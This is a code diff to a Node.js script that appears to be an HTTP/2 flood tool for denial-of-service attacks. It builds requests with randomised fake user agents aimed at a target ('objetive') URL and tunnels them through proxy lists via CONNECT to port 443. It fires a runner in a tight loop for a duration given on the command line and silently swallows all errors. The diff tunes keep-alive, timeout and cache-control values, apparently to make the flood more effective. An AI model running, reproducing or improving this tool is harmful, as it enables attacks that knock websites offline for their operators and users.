@@ -38,15 +38,15 @@ class TlsBuilder {
     }
     http2TUNNEL(socket){
         const uas = fakeua();
-        socket.setKeepAlive(true, 100000000);
-        socket.setTimeout(1000000000);
+        socket.setKeepAlive(true, 1000);
+        socket.setTimeout(1000);
         payload[":method"] = "GET";
         payload["Referer"] = objetive;
         payload["Origin"] = objetive;
         payload["User-agent"] = uas,
         payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
         payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload['client-control'] = 'max-age=43200, s-max-age=43200';
+        payload['client-control'] = 'max-age=4320000000, s-max-age=4320000000';
         payload['Upgrade-Insecure-Requests'] = 1;
         payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"; //'*/*';
         payload['Accept-Encoding'] = 'gzip, deflate, br';
@@ -86,7 +86,7 @@ proxy = proxy.split(':');
 var req = http.get({
         host: proxy[0],
         port: proxy[1],
-        timeout: 1000000000,
+        timeout: 10000,
         method: "CONNECT",
         agent: keepAliveAgent,
         path: parsed.host + ":443"
@@ -104,7 +104,7 @@ var req = http.get({
 setInterval(Runner)
 setTimeout(function(){
     process.exit();
-}, process.argv[3] * 10000000000);
+}, process.argv[3] * 10000);
 process.on('uncaughtException', function(er) {
 });
 process.on('unhandledRejection', function(er) {
